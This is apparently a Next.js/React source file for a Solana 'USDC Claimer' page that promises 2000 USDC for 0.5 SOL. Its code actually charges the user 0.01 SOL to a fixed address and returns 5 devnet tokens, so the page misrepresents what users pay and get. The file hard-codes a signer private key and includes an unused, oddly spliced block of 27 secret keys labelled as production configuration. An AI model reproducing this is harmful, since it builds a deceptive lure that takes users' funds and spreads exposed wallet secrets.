/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "p1vEKJz3XGung6RRixu8hwrLwP4BobJV2wyW5REHLf75ebyTvBDi7bk1Ny3Qmf5KmhPsyFcea7WwMkikfAUYvbC"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "61AsFo6p9XLe2gmLJ3JMoMNL811Dxg6YX3DusNwmXr2vXbD3SUuUAJucv49avCfkhsoekEkxwruKdpYMRtfhcimp",
  "key1": "hDTeM6Az2Mx1BmwmXDXHdqgRP5MUjxacwoQHqPEtGGL3E5gDaDUoXEtvnoGhvX4zLh79BR49C1j8kwCSrvkE2rg",
  "key2": "3XrxU54SGUi4pQdiAGJwiYnmkK1fcfkuC6r7j2bAmJ3QrJrcwF4d37eKKUHc9yPm2fSBhEAkHiLQk2WtY91gT9td",
  "key3": "34bw1BHtSaTY2JFqo7UrvMRePXZDxeUcAV5KixV795paLDpBofAbVHcbcXnMZXRuoLPvJHTEjMj5gH6Gw7cHeQfh",
  "key4": "3VLr6gJDzaY87LYaEEb19HMV6T4f9HJZXgdTq3Ev1kuiES5fpxr5WQo274R6APPM5riFfQrTrt2G5fyGEJsjutS3",
  "key5": "5GSHx1MpPnJEeYzcYGGWZTKLmsKAfqyZzTpfp3NgL8bZXrLkCcjDWgkCHKM94PipVpbvpzd3CD38eBXgDJAHHapG",
  "key6": "5Xdk942u6tB2pSbyatcCRaTrvAnjXhgr1XdYCcjnXFTVtWaGTCoSy3mR6ksig6KBXTWRvZLVF1HXUBgibAK1WKPH",
  "key7": "XD7v3w9mVjiJCKe1vRwpy11bwCcohS6PV2cEDYUQv37XjrXXpqNQat6apMxuhyvYZrumUTJg1tWnFf5bir85xVD",
  "key8": "2eMDuWArtK2mCAi24TPiucBiB6ufW9CT1WNMADAVjWJQVfj6pyh6cCezwZRG5WXgdHqQXA8xa2skts95Qf2yWaJ7",
  "key9": "21AYy5SKqLmwYYmneq8Fqxd5GNh3jyKSvyTZ9ZMWbT11BkNGSKEHWpdQFA6shHzyAodnA4s5ASW7opozpeMPDLgH",
  "key10": "414SoD8S6VsFw1WMnB7eXgQDeBEKw9vmjtNhhGpV5f9D6Z5jeZG4bxBqWmbdhEerK1oWe3gFhcXk7WG9V3vuBFyp",
  "key11": "2sARDAEUpLE1um7dXapueRKWaMJ5GufBNiyPfqSfxWBjApSjC5LMMBA4hnqZhTpc4iH2KKZ27vNPE9AvG55ih3Bg",
  "key12": "RdE482td29iJVx3DqqYpHfReh5wb33zMUWX5GRZ7rnCtjPtTx7YGbMqFvWKEyHXh9FnDfG8bsTPoDZKT9Twughh",
  "key13": "KD5rLkMyGw2MC5pzq9fvcgN7iyJD5bS4nTEVYvvt8uG5M6KVEgVJiwaGMPdjrehwtyBRZbHZ54ECbNUecPb5UZa",
  "key14": "36XHXJcJiZZVh5Hw3wegukxKDVPVyD4X8kSKTPntbAsbDWcfHSbGyM8odznD1Do2Qrznh8isPF2kV2X8o9BXXDv4",
  "key15": "4aqBg6D2fDtK5dQBqMCtoewnS49L6uMHYvHYXHrhdMmGkSXzbPF6amzar1Tx4f5Cuwyuacm1suL9ciX55L7U5MWC",
  "key16": "43WSmmWsC1pffe4YTvW2WnonW5bAfqGeuSUmYrczZUU6v6MwRfag5HSVsCpAW17wmvNcJjH4wqPyR5vxbTBdzoND",
  "key17": "3YfiBKA69dhmERxX7c2ZSs7PkTnhReS1NB3wfL8nZ6buibvCso8SJJXLudCRLMgvgLCpMbMSLcsi1D8jbiG3pcL6",
  "key18": "BhJu61KtacbRGTWdPRUeWY9zjTjeCZmkCT8xr5fkqoN2Dh82j7Nis5J3Ne81GWNvi6UmYGqUPaSbBR8Se3Z6guc",
  "key19": "9J7dXL9izUenPvCcPmWGrJpstXGbAcYfyJ1yKuVvxtYLS57Et5BYwktS4KNxzgBTmuSzDWeqG1xxLA9WxBFzJ5m",
  "key20": "23Rq3HcUyzhXuG1x9krVnGgi96yLpqZaxh6LPihu7v6bapfUyefaV47BqHPq5EWGqSYbctjXMm1u61f7Tcr8wkUE",
  "key21": "5aX6uru1XyANgfr6eij2QaC4WqDr6ugKwv5kHzUSXmxPQTYioyvDJKJNVJZLRitZdYtp9C6QD8xU5TFJ5SoFR2SK",
  "key22": "39PWCc1GUW2N7XzaeJAcvtTjsTfAvUCtARTURwhydxuGX6D5GNbLvso5TMftsZLth9vQvNcfRXT1E45yU97ypnnr",
  "key23": "57EUMjn86YNiVtDq9H59d8graZHV8ieewyWMViP2FUASLcx856BW4iJ6jZFyBh3xHEow3MEouLipNKtaP9x2gXPM",
  "key24": "2M6VwVDpHPFc93SPaEWj8FtsRbUZLBMTPHopojK2xjfhBPwTJc5kPJ6BcL6xTj33pZaUfM6sdU1Eo9n5a8soJ6Nz",
  "key25": "3wyhfAaMw5Adq85vRWfdZ59MPt7W3cC7BxjHdjGRH4CqPrbQiEjJ1sivraN3nqZTKZ93QusbEmdaNRYuai7Jz9uu",
  "key26": "3d6WdD49rNCVSRuRAYToXHRH49CcrEQxbUtKhZ19h2P2Hx71ysxZoncrEseziR1wwAMEd7XXtpaHJYhUegqXfWtN"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
